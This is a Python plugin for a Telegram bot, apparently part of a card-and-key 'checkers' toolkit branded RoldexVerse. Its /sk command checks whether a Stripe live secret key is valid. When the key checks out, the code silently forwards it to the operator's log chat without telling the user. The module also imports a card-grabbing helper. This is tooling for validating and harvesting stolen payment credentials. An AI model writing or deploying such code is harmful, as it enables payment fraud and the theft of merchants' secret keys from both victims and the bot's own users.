"""
≛ <b>Commands Available</b> ≛

──────────────────────
<code>/sk</code> key || <reply_to_msg> - Check Stipe Key
──────────────────────

©<a href="https://t.me/roldexverse">RoldexVerse</a>
"""


import os
from pathlib import Path
import re
import time
import requests

from telethon import Button
import telethon

from mills import LOG_CHAT, uclient
from mills.decorators import bot_cmd
from telethon.utils import *

from mills.plugins.checkers.utils.tools import check_sk, getcards

ccs = []





@bot_cmd(cmd="sk", text_only = True)
async def _(m):
    inp = m.pattern_match.group(1).strip()
    if len(inp) < 1 or not inp.startswith('sk_live_'):
        return await m.reply("Format: .sk sk_key")
    r_text, r_logo, r_respo = check_sk(inp)
    if r_logo == '✅':
        await m.client.send_message(LOG_CHAT, inp)
    text= f"""
Sk key checker:

{r_text}{r_logo} - <code>{inp}</code>[{r_respo}]

<b>Scrapped By</b> -» <a href= "tg://user?id={m.sender.id}">{m.sender.id}</a>
<b>Host</b> -» <a href="https://t.me/roldexverse">RoldexVerse</a>
"""
    await m.reply(text)
        